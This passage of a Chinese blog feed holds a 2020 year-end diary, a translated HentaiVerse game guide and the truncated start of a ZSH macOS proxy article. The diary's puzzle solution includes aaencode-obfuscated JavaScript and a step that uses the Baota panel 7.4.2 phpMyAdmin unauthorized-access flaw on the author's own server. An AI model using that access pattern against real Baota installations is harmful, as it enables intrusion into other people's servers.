src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 